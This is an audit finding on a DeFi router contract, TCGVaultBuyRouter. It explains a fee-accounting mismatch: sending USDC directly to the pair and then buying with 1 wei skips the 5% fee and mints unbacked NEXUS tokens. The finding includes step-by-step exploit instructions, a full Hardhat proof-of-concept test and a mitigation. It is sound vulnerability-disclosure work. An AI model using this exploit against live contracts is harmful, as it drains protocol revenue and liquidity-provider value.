### [C-1] Input Accounting Mismatch allows attackers to bypass protocol fees, drain LP value, and mint unbacked NEXUS tokens

**Description**
The `TCGVaultBuyRouter.sol` contract implements two distinct payment routing methods: a "Routeur ON" for USDC buys (which charges a 5% USDC fee and mints a NEXUS cashback bonus) and a "Routeur OFF" for direct DEX swaps (which charges a 6% TCGV fee but gives no NEXUS). To prevent double taxation, the `TCGVaultBuyRouter` is explicitly excluded from the 6% TCGV DEX fee.

A critical vulnerability exists in `buyTCGVWithUSDC()` due to an "Input Accounting Mismatch". The contract calculates the 5% USDC protocol tax based strictly on the user-provided `usdcAmount` parameter. However, the actual swap execution uses the DEX pair's real balance delta (`amountInput = _usdc.balanceOf(pair) - reserveUSDC`).

An attacker can exploit this by mixing both routing methods:
1. They transfer their capital (e.g., 100,000 USDC) directly to the PancakeSwap Pair (mimicking a Routeur OFF trade).
2. They call `buyTCGVWithUSDC(usdcAmount = 1 wei)` on the router (Routeur ON).

Because the tax is calculated on `1 wei`, the 5% fee rounds down to exactly `0`. The router then executes the swap using the massive 100,000 USDC balance already sitting in the pair. Since the router is excluded from the TCGV DEX taxes, the attacker receives the massive TCGV output completely tax-free. Finally, the contract mints a massive 30% NEXUS bonus based on the *actual* TCGV output, heavily inflating the NEXUS supply for a user who paid zero fees.

**Impact**
**Critical.** This vulnerability causes a complete and direct loss of protocol revenue. Every 5% USDC tax intended for the vault, marketing, and community can be completely bypassed by any user or MEV bot. Furthermore, the attacker extracts disproportionate value from the liquidity pool (harming LP providers) and mints massive amounts of unbacked NEXUS tokens, severely diluting the governance token's value.

**Severity Justification:**
Evaluated as **Critical / High** based on standard auditing severity matrices (e.g., CodeHawks / Code4rena):
- **Impact (High):** Direct and complete loss of protocol fee revenue, plus severe economic dilution of the NEXUS token.
- **Likelihood (High):** The exploit is completely deterministic, unprivileged, and requires no special market conditions. Any user can execute this bypass at any time.
- **Result:** High Impact + High Likelihood = Critical / High Severity.

**Proof of Concept**
To reproduce the mathematical invariant failure proving the revenue loss, run the Hardhat test below. 

```typescript
// test/TCGVaultBuyRouter_FeeAccountingMismatch.test.ts
// =====================================================================
// HOW TO RUN THIS TEST:
// 1. Save this code in your project under test/TCGVaultBuyRouter_FeeAccountingMismatch.test.ts
// 2. Open your terminal at the root of the Hardhat project.
// 3. Execute the following command:
//    npx hardhat test test/TCGVaultBuyRouter_FeeAccountingMismatch.test.ts
// =====================================================================

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import hre from "hardhat";
import { parseEther, parseUnits, getContractAddress, zeroAddress } from "viem";

const { viem, networkHelpers } = await hre.network.connect();

async function deployFixture() {
  const wallets = await viem.getWalletClients();
  const owner = wallets[0]!;
  const userA = wallets[1]!; // Scenario A User
  const userB = wallets[2]!; // Scenario B User
  const vault = wallets[3]!;
  const marketing = wallets[4]!;
  const community = wallets[5]!;

  const usdcContract = await viem.deployContract("contracts/test/MockUSDC.sol:MockUSDC", [], { client: { wallet: owner } });
  const usdc = await viem.getContractAt("MockUSDC", usdcContract.address);
  const usdcAddress = usdcContract.address;

  const factoryContract = await viem.deployContract("MockUniswapV2Factory", [], { client: { wallet: owner } });
  const factoryAddress = factoryContract.address;
  const factory = await viem.getContractAt("MockUniswapV2Factory", factoryAddress);

  const routerContract = await viem.deployContract("MockUniswapV2Router", [factoryAddress, usdcAddress], { client: { wallet: owner } });
  const routerAddress = routerContract.address;

  const publicClient = await viem.getPublicClient();
  const n0 = BigInt(await publicClient.getTransactionCount({ address: owner.account.address, blockTag: "pending" }));
  const futureTcgv = getContractAddress({ from: owner.account.address, nonce: n0 + 1n });
  const nexusAddr = getContractAddress({ from: owner.account.address, nonce: n0 });

  await viem.deployContract("TCGNexusToken", [futureTcgv, userA.account.address, vault.account.address], { client: { wallet: owner } });
  const tcgvContract = await viem.deployContract("TCGVaultToken", [
    zeroAddress,
    routerAddress,
    vault.account.address,
    marketing.account.address,
    community.account.address,
    nexusAddr,
    owner.account.address,
  ], { client: { wallet: owner } });
  const tcgvAddress = tcgvContract.address;
  const tcgv = await viem.getContractAt("TCGVaultToken", tcgvAddress);

  const nexus = await viem.getContractAt("TCGNexusToken", nexusAddr);

  await factory.write.createPair([tcgvAddress, usdcAddress], { account: owner.account });
  const pairAddress = await factory.read.getPair([tcgvAddress, usdcAddress]);
  const pair = await viem.getContractAt("MockUniswapV2Pair", pairAddress);
  await tcgv.write.setPair([pairAddress, true], { account: owner.account });

  const mintAmount = parseEther("1000000");
  const liqAmount = parseEther("900000");
  await tcgv.write.mintPresale([owner.account.address, mintAmount], { account: owner.account });

  const buyRouter = await viem.deployContract("TCGVaultBuyRouter", [
    routerAddress,
    usdcAddress,
    tcgvAddress,
    vault.account.address,
    marketing.account.address,
    community.account.address,
  ], { client: { wallet: owner } });

  await tcgv.write.setBuyRouter([buyRouter.address], { account: owner.account });
  await tcgv.write.setExcludedFromFees([buyRouter.address, true], { account: owner.account });

  // Seed LP pool
  const usdcLiq = parseUnits("10000", 6);
  await usdc.write.mint([owner.account.address, usdcLiq], { account: owner.account });
  await usdc.write.transfer([pairAddress, usdcLiq], { account: owner.account });
  await tcgv.write.transfer([pairAddress, liqAmount], { account: owner.account });
  await pair.write.mint([owner.account.address], { account: owner.account });

  return { owner, userA, userB, vault, marketing, community, usdc, tcgv, nexus, buyRouter, pair, publicClient };
}

describe("TCGVaultBuyRouter - Fee Accounting Mismatch", function () {
  it("Proves protocol loses fee revenue when DEX pair contains pre-existing balances", async function () {
    const fixA = await networkHelpers.loadFixture(deployFixture);
    
    // Capital: 1000 USDC
    const capital = parseUnits("1000", 6);
    const configuredFeeBasisPoints = 500n; // 5% total fee
    
    // ==========================================
    // SCENARIO A: Normal Buy
    // ==========================================
    await fixA.usdc.write.mint([fixA.userA.account.address, capital], { account: fixA.owner.account });
    await fixA.usdc.write.approve([fixA.buyRouter.address, capital], { account: fixA.userA.account });

    const uUsdcBeforeA = await fixA.usdc.read.balanceOf([fixA.userA.account.address]);
    const pairUsdcBeforeA = await fixA.usdc.read.balanceOf([fixA.pair.address]);
    const vaultFeesBeforeA = await fixA.buyRouter.read.pendingUsdcFees([fixA.vault.account.address]);
    const marketingFeesBeforeA = await fixA.buyRouter.read.pendingUsdcFees([fixA.marketing.account.address]);

    await fixA.buyRouter.write.buyTCGVWithUSDC([capital, 0n, BigInt(Math.floor(Date.now() / 1000) + 300)], { account: fixA.userA.account });

    const uUsdcAfterA = await fixA.usdc.read.balanceOf([fixA.userA.account.address]);
    const pairUsdcAfterA = await fixA.usdc.read.balanceOf([fixA.pair.address]);
    const vaultFeesAfterA = await fixA.buyRouter.read.pendingUsdcFees([fixA.vault.account.address]);
    const marketingFeesAfterA = await fixA.buyRouter.read.pendingUsdcFees([fixA.marketing.account.address]);

    const actualUserSpentA = uUsdcBeforeA - uUsdcAfterA;
    const protocolFeeCollectedA = (vaultFeesAfterA - vaultFeesBeforeA) + (marketingFeesAfterA - marketingFeesBeforeA);
    const expectedFeeForActualSwapInputA = (actualUserSpentA * configuredFeeBasisPoints) / 10000n;
    const feeShortfallA = expectedFeeForActualSwapInputA - protocolFeeCollectedA;

    // Reset environment by deploying a fresh fixture
    const fixB = await networkHelpers.loadFixture(deployFixture);
    
    // ==========================================
    // SCENARIO B: Pre-existing Pair Balance
    // ==========================================
    await fixB.usdc.write.mint([fixB.userB.account.address, capital], { account: fixB.owner.account });
    
    const dust = 1n;
    const directTransfer = capital - dust;
    
    const pairBalanceBeforeBuy = await fixB.usdc.read.balanceOf([fixB.pair.address]);
    await fixB.usdc.write.transfer([fixB.pair.address, directTransfer], { account: fixB.userB.account });
    
    await fixB.usdc.write.approve([fixB.buyRouter.address, dust], { account: fixB.userB.account });

    const vaultFeesBeforeB = await fixB.buyRouter.read.pendingUsdcFees([fixB.vault.account.address]);
    const marketingFeesBeforeB = await fixB.buyRouter.read.pendingUsdcFees([fixB.marketing.account.address]);

    await fixB.buyRouter.write.buyTCGVWithUSDC([dust, 0n, BigInt(Math.floor(Date.now() / 1000) + 300)], { account: fixB.userB.account });

    const pairBalanceAfterBuy = await fixB.usdc.read.balanceOf([fixB.pair.address]);
    const vaultFeesAfterB = await fixB.buyRouter.read.pendingUsdcFees([fixB.vault.account.address]);
    const marketingFeesAfterB = await fixB.buyRouter.read.pendingUsdcFees([fixB.marketing.account.address]);

    const actualPairInputB = pairBalanceAfterBuy - pairBalanceBeforeBuy;
    const protocolFeeCollectedB = (vaultFeesAfterB - vaultFeesBeforeB) + (marketingFeesAfterB - marketingFeesBeforeB);
    const expectedFeeForActualSwapInputB = (actualPairInputB * configuredFeeBasisPoints) / 10000n;
    const feeShortfallB = expectedFeeForActualSwapInputB - protocolFeeCollectedB;

    // Verify Scenario A is correct
    assert.strictEqual(feeShortfallA, 0n, "Scenario A should have zero fee shortfall");
    
    // Assert Scenario B bypasses fees while producing massive input mismatch
    assert.ok(actualPairInputB > dust, "Scenario B: Actual pair input should far exceed usdcAmount");
    assert.ok(protocolFeeCollectedB < expectedFeeForActualSwapInputB, "Scenario B: Actual fee should be much lower than expected fee");

    if (actualPairInputB > dust && protocolFeeCollectedB < expectedFeeForActualSwapInputB) {
        assert.fail(
            `FEE ACCOUNTING MISMATCH DETECTED\n` +
            `Protocol fee revenue is bypassed because fee accounting uses the user-controlled usdcAmount ` +
            `while the underlying pair calculates swap input from its balance delta.\n` +
            `Loss: ${feeShortfallB.toString()} USDC wei`
        );
    }
  });
});
```

**Recommended Mitigation**
Do not calculate fees based on the user-supplied `usdcAmount` if the actual swap execution is based on the DEX pair's balance delta.

Modify `_buyWithUSDC` in `TCGVaultBuyRouter.sol` to either:
1. Enforce that the liquidity used in the swap strictly equals the post-tax `usdcAmount`.
2. Or (better), calculate the exact amount of USDC consumed by the swap, and then retroactively deduct the fee based on the actual swap volume. This ensures the protocol accurately captures 5% of all routed volume, regardless of pre-existing balances.
